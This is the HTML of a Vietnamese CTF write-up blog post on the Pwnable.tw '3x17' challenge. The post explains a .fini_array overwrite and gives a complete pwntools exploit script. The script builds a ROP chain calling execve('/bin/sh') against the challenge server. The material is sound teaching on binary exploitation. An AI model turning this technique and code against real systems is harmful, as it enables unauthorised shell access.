@@ -1,0 +1,175 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>[Pwnable.tw] – 3×17 // DatNLQ</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.88.1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="DatNLQ" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://datnlq.github.io/css/main.min.4a7ec8660f9a44b08c4da97c5f2e31b1192df1d4d0322e65c0dbbc6ecb1b863f.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="[Pwnable.tw] – 3×17"/>
+<meta name="twitter:description" content="[Pwnable.tw] – 3×17 Chào các bạn nay chúng ta sẽ đến với bài tiếp theo của pwnable là bài 3x17.
+Đầu tiên chúng ta sẽ kiểm tra các thông tin cơ bản về thông tin file và các cơ chế bảo mật như sau :
+Chạy thử chương trình vào sau đó dùng IDA để có thể reverse lại code C (nếu có thể ):
+Sau khi dùng IDA lần theo flow string của file binary thì mình đã có thể tìm ra được hàm của chúng ta như sau :"/>
+
+    <meta property="og:title" content="[Pwnable.tw] – 3×17" />
+<meta property="og:description" content="[Pwnable.tw] – 3×17 Chào các bạn nay chúng ta sẽ đến với bài tiếp theo của pwnable là bài 3x17.
+Đầu tiên chúng ta sẽ kiểm tra các thông tin cơ bản về thông tin file và các cơ chế bảo mật như sau :
+Chạy thử chương trình vào sau đó dùng IDA để có thể reverse lại code C (nếu có thể ):
+Sau khi dùng IDA lần theo flow string của file binary thì mình đã có thể tìm ra được hàm của chúng ta như sau :" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://datnlq.github.io/posts/3x17/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-12-09T08:43:30+07:00" />
+<meta property="article:modified_time" content="2021-12-09T08:43:30+07:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://datnlq.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="DatNLQ" /></a>
+      <h1>DatNLQ</h1>
+      <p>DatNLQ&#39;s personal website</p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/datnlq" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>My Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">[Pwnable.tw] – 3×17</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Dec 9, 2021
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          3 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h2 id="pwnabletw--317httpspwnabletwchallenge32">[Pwnable.tw] – <a href="https://pwnable.tw/challenge/#32">3×17</a></h2>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/3x17/3x17.png?raw=true" alt="img"></p>
+<p>Chào các bạn nay chúng ta sẽ đến với bài tiếp theo của pwnable là bài 3x17.</p>
+<p>Đầu tiên chúng ta sẽ kiểm tra các thông tin cơ bản về thông tin file và các cơ chế bảo mật như sau :</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/3x17/3x17_checksec.png?raw=true" alt="img"></p>
+<p>Chạy thử chương trình vào sau đó dùng IDA để có thể reverse lại code C (nếu có thể ):</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/3x17/3x17_runtest.png?raw=true" alt="img"></p>
+<p>Sau khi dùng IDA lần theo flow string của file binary thì mình đã có thể tìm ra được hàm của chúng ta như sau :</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/3x17/3x17_ida.png?raw=true" alt="img"></p>
+<p>Sau khi làm các bước trên chúng ta có thể rút ra vài kết luận như sau :
++ Đây là 1 file bin 64-bit, cơ chế bảo mật NX được bật
++ IDA phân tích ra mã C tuy nhiên rất rối
++ Flow của chương trình sẽ là thay đổi giá trị của 1 địa chỉ bất kỳ</p>
+<p>Tới đây thì mình bị stuck 1 chút vì không thấy được hướng đi tiếp theo như nào, tuy nhiên bài này đã tiếp thêm động lực cho mình <a href="https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2016/CODEGATE/pwnable/oldschool">https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2016/CODEGATE/pwnable/oldschool</a></p>
+<p>Bài này đã sử dụng kỹ thuật overwrite <a href="http://blog.k3170makan.com/2018/10/introduction-to-elf-format-part-v.html">_fini_array</a>.
+_fini_array section là 1 vùng trong binary cung cấp các hàm deconstructor cần thiết cho quá trình kết thúc chương trình sau khi hàm main() return. Ngược với .init_array section là vùng cung cấp các hàm constructor cần thiết cho quá trình khởi tạo trước khi thực hiện hàm main().</p>
+<p>_fini_array section gồm 2 entry:</p>
+<pre><code>+ _do_global_dtors_aux: các destructors xử lý khi _fini_array ko được xác định.
++foo_destructor: địa chỉ của hàm destructor.
+</code></pre>
+<p>Chương trình gọi 2 hàm trên theo thứ tự từ dưới lên, nghĩa là gọi foo_destructor trước rồi mới đến _do_global_dtors_aux.</p>
+<p>Chúng ta có thể tìm thấy _fini_array section trong bài này ở địa chỉ 0x4b40f0:</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/3x17/3x17_finiarray.png?raw=true" alt="img"></p>
+<p>Flow theo hàm main chúng ta có thể nhận thấy, sau hàm main, retaddr thì sẽ là địa chỉ cả 2 hàm gọi _fini_array :</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/3x17/3x17_maintofini.png?raw=true" alt="img"></p>
+<p>Hàm sub_402960 nằm tại 0x402960 chính là hàm gọi _fini_array khi chương trình kết thúc (hàm sub_4028D0 là hàm gọi _init_array khi bắt đầu chương trình).</p>
+<p>Như vậy chúng ta có thể tạo 1 vòng lặp vô hạn bằng cách ghi đè vào _fini_aray như sau :</p>
+<p>payload = p64(_fini_array) + p64(main)</p>
+<p>Pay load có nghĩa là khi chương trình kết thúc sẽ nhảy vào _fini_array và đi đến hàm main() như vậy sẽ tạo 1 vòng lặp vô hạn cho chúng ta.</p>
+<p>_fini_array = 0x402960
+main = 0x401b6d</p>
+<p>Sau đó chúng ta dùng ROPgadget để tìm các hàm phù hợp để viết rop như sau :</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">
+syscall   = 0x4022b4
+pop_rdi   = 0x401696
+pop_rsi   = 0x406c30
+pop_rdx   = 0x446e35
+pop_rax   = 0x41e4af
+leave_ret = 0x401c4b
+
+</code></pre></div><p>Sau khi đã có rop rồi thì chúng ta sẽ ghi đè lên ghi đè sẽ bắt đầu từ địa chỉ tiếp theo trong _fini_array section:</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/3x17/3x17_ropstack.png?raw=true" alt="img"></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">from pwn import *
+context(arch=&#34;amd64&#34;,os=&#39;linux&#39;)
+
+syscall_ret = 0x471db5
+pop_rax_ret = 0x41e4af
+pop_rdx_ret = 0x446e35
+pop_rsi_ret = 0x406c30
+pop_rdi_ret = 0x401696
+bin_sh_addr = 0x4B9500
+
+fini_array = 0x4B40F0
+main_addr = 0x401B6D
+libc_csu_fini = 0x402960
+leave_ret = 0x401C4B
+
+esp = 0x4B4100
+ret = 0x401016
+
+
+def write(addr,data):
+    io.sendafter(&#39;addr:&#39;,str(addr))
+    io.sendafter(&#39;data:&#39;,data)
+
+def exploit():
+    #Make the program run in a loop fini_array[0] fini_array[1]
+    write(fini_array,p64(libc_csu_fini)+p64(main_addr))
+
+     #Write /bin/sh in a readable and writable place
+    write(bin_sh_addr,&#34;/bin/sh\x00&#34;)
+
+    #syscall(&#39;/bin/sh\x00&#39;,0,0)
+    write(esp,p64(pop_rax_ret))
+    write(esp+8,p64(0x3b))
+    write(esp+16,p64(pop_rdi_ret))
+    write(esp+24,p64(bin_sh_addr))
+    write(esp+32,p64(pop_rsi_ret))
+    write(esp+40,p64(0))
+    write(esp+48,p64(pop_rdx_ret))
+    write(esp+56,p64(0))
+    write(esp+64,p64(syscall_ret))
+    #gdb.attach(p,&#34;b *0x401C4B&#34;)
+
+     #End the program loop and enter ROP
+    write(fini_array,p64(leave_ret)+p64(ret))
+
+    io.interactive()
+
+#io = process(&#39;./3x17&#39;)
+io = remote(&#39;chall.pwnable.tw&#39;,10105)
+exploit()
+</code></pre></div><p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/3x17/3x17_catflag.png?raw=true" alt="img"></p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
